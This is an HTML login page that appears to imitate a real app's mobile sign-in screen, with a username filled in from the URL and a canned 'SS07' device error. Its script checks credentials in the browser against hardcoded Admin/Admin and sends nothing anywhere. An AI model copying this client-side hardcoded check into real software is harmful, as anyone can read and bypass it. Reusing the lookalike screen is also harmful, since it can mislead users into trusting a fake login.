<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
    body {
      font-family: "Inter", sans-serif;
    }
    ::-webkit-scrollbar {
      display: none;
    }
    input[type="checkbox"] {
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
      width: 1rem;
      height: 1rem;
      border: 2px solid #d1d5db;
      border-radius: 0.25rem;
      position: relative;
      cursor: pointer;
    }
    input[type="checkbox"]:checked::after {
      content: '';
      position: absolute;
      left: 3px;
      top: 0px;
      width: 5px;
      height: 10px;
      border: solid #00b0ff;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }
    input[type="checkbox"]:focus {
      outline: none;
      box-shadow: 0 0 0 2px rgba(0,176,255,0.3);
    }
    #loginBtn {
      transition: bottom 0.30s ease;
      min-width: 75%;
    }
    /* Input containers slightly wider */
    .input-container {
      max-width: 95%;
      margin: 0 auto;
    }
    /* Ensure inputs fill the container */
    input[type="text"], input[type="password"] {
      width: 100%;
    }
    /* Move Password label and input line */
    label[for="password"] {
      position: relative;
      top: -3px;
    }
    #password {
      position: relative;
      top: -2.7px;
    }
    /* Move checkbox and text up */
    label.inline-flex.items-center {
      position: relative;
      top: -2px;
    }
    /* Move forgot password text up */
    #forgotPassword {
      position: relative;
      top: -3.5px;
    }
    /* Error message styling */
    #loginForm #errorMsg {
      margin-top: -4px; 
      font-size: 0.875rem;
      line-height: 1.25rem;
      word-wrap: break-word;
    }
    /* Adjust the Log In heading */
    h1 {
      position: relative;
      top: -2px;
      font-size: 1.75rem;
      font-weight: 500;
    }
  </style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-md mx-auto relative">
  <div class="pt-4 px-6 relative flex flex-col flex-grow">
    <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] text-2xl leading-none font-medium">
      <i class="fas fa-chevron-left"></i>
    </button>
    <h1 class="mt-12 mb-8 text-center text-black text-2xl font-medium font-sans">Log In</h1>
    <form id="loginForm" class="flex flex-col space-y-6">
      <div class="flex flex-col input-container">
        <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">
          USERNAME, EMAIL, OR PHONE
        </label>
        <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required />
        <p id="errorMsg" class="text-sm text-red-500 font-normal leading-tight hidden break-words">
          SS07: Device associated with high number of accounts. Learn more 
          <a href="#" class="text-blue-600 underline">here</a>.
        </p>
      </div>
      <div class="flex flex-col relative input-container">
        <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
        <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required />
        <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
          <i id="eyeIcon" class="fas fa-eye-slash"></i>
        </button>
      </div>
      <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
        <input type="checkbox" checked />
        <span>Save Login Info on your iCloud devices</span>
      </label>
      <a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
    </form>
  </div>

  <button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const usernameInput = document.getElementById("username");
      const passwordInput = document.getElementById("password");
      const loginBtn = document.getElementById("loginBtn");
      const errorMsg = document.getElementById("errorMsg");
      const forgotPassword = document.getElementById("forgotPassword");

      const pathUsername = window.location.pathname.split("/")[1];
      if(pathUsername) usernameInput.value = decodeURIComponent(pathUsername);

      function checkInputs() {
        if(usernameInput.value.trim() && passwordInput.value.trim()) {
          loginBtn.classList.remove("bg-gray-400");
          loginBtn.classList.add("bg-[#00b0ff]");
          loginBtn.disabled = false;
        } else {
          loginBtn.classList.remove("bg-[#00b0ff]");
          loginBtn.classList.add("bg-gray-400");
          loginBtn.disabled = true;
        }
      }

      usernameInput.addEventListener("input", checkInputs);
      passwordInput.addEventListener("input", checkInputs);

      loginBtn.addEventListener("click", function() {
        if(usernameInput.value.trim() && passwordInput.value.trim()) {
          if(usernameInput.value !== "Admin" || passwordInput.value !== "Admin") {
            errorMsg.classList.remove("hidden");
            passwordInput.value = "";
            loginBtn.classList.remove("bg-[#00b0ff]");
            loginBtn.classList.add("bg-gray-400");
            loginBtn.disabled = true;
          } else {
            window.location.href = "admin.html";
          }
        }
      });

      window.togglePassword = function() {
        if(passwordInput.type === "password") {
          passwordInput.type = "text";
          document.getElementById("eyeIcon").classList.replace("fa-eye-slash", "fa-eye");
        } else {
          passwordInput.type = "password";
          document.getElementById("eyeIcon").classList.replace("fa-eye", "fa-eye-slash");
        }
      }

      function moveAboveKeyboard() {
        const gap = 8;
        const forgotBottom = forgotPassword.getBoundingClientRect().bottom;
        const viewportHeight = window.innerHeight;
        const newBottom = Math.max(viewportHeight - forgotBottom + gap - 30, 16);
        loginBtn.style.bottom = newBottom + "px";
      }

      function resetButtonPosition() {
        loginBtn.style.bottom = "8px";
      }

      usernameInput.addEventListener("focus", moveAboveKeyboard);
      passwordInput.addEventListener("focus", moveAboveKeyboard);
      usernameInput.addEventListener("blur", resetButtonPosition);
      passwordInput.addEventListener("blur", resetButtonPosition);
      window.addEventListener("resize", resetButtonPosition);

      usernameInput.addEventListener("keydown", function(e) {
        if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
      });
      passwordInput.addEventListener("keydown", function(e) {
        if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
      });
    });
  </script>
</body>
</html>
